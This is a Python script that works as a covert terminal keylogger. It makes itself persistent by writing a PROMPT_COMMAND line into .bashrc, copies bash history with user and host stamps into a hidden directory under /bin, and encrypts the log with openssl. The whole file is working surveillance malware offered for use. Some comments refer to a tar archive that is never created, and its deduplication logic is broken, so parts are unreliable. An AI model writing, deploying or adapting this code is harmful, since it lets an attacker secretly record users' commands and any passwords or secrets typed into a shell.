import os
import socket
import getpass
from datetime import datetime

def append_to_bashrc(line):
    username = getpass.getuser()
    # Append to root's .bashrc
    if username == "root":
        home_directory = "/root"
    else:
        home_directory = f"/home/{username}"
    
    # Check if line already exists
    with open(f"{home_directory}/.bashrc", "r") as bashrc_file:
        if line in bashrc_file.read():
            #print(f"Line '{line}' already exists in .bashrc")
            return

    # Append the line if it doesn't exist
    with open(f"{home_directory}/.bashrc", "a") as bashrc_file:
        bashrc_file.write(line + "\n")

line_to_append = 'export PROMPT_COMMAND="history -a;python /bin/.terminal-keylogger/.terminal-keylogger.py;$PROMPT_COMMAND"'
append_to_bashrc(line_to_append)

def modify_bash_history(input_file, output_file):
    # We check if output file exists
    if os.path.exists(output_file):
        # Read the existing modified bash history file
        with open(output_file, 'r') as f:
            existing_lines = set(f.readlines())
    else:
        existing_lines = set()

    # Then we read the original bash history file
    with open(input_file, 'r') as f:
        bash_history = f.readlines()

    # We look for new lines to append to the file
    new_lines = []
    for line in bash_history:
        if line not in existing_lines:
            new_lines.append(line)

    # Modifying new lines
    modified_new_lines = []
    for line in new_lines:
        if ":~$" in line and "T" in line and "- BY" in line:
            modified_new_lines.append(line)
        else:
            hostname = socket.gethostname()
            modified_time = os.path.getmtime(input_file)
            timestamp = datetime.fromtimestamp(modified_time).strftime('%Y-%m-%d %H:%M:%S')
            username = getpass.getuser()
            modified_new_lines.append(f":~$ {line.rstrip()} \nT {timestamp} - BY {username}@{hostname}\n")

    # Append modified new lines to the output file
    with open(output_file, 'a') as f:
        f.writelines(modified_new_lines)

if __name__ == "__main__":
    hostname = socket.gethostname()
    # Get the current username
    username = getpass.getuser()
    if username == "root":
        input_file = "/root/.bash_history"
    else:
        home_dir = None
        for entry in os.listdir("/home"):
            if os.path.isdir(os.path.join("/home", entry)) and entry != "root":
                home_dir = entry
                break

        if home_dir:
           input_file = f"/home/{home_dir}/.bash_history"
    

    output_directory = "/bin/.terminal-keylogger/"

    # Ensure the output directory exists
    os.makedirs(output_directory, exist_ok=True)

    # Construct the path for the output file
    output_file = os.path.join(output_directory, f'termkeys-{username}on{hostname}.md')

    # Modify bash history and append new lines to the output file
    modify_bash_history(input_file, output_file)

    # Encrypt the tar archive with a password using PBKDF2 key derivation
    password = "your_password"  # Replace this with your own password
    encrypted_file = output_file + '.enc'
    os.system(f'openssl aes-256-cbc -a -salt -pbkdf2 -in {output_file} -out {encrypted_file} -k {password}')

    # Remove the original tar archive
    os.remove(output_file)

    print("___")
    
    
    # Command To Decrypt - 
    # openssl aes-256-cbc -d -a -salt -pbkdf2 -in termkeys-attackvector99onsoren.md.tar.gz.enc -out output_file.md -k your_password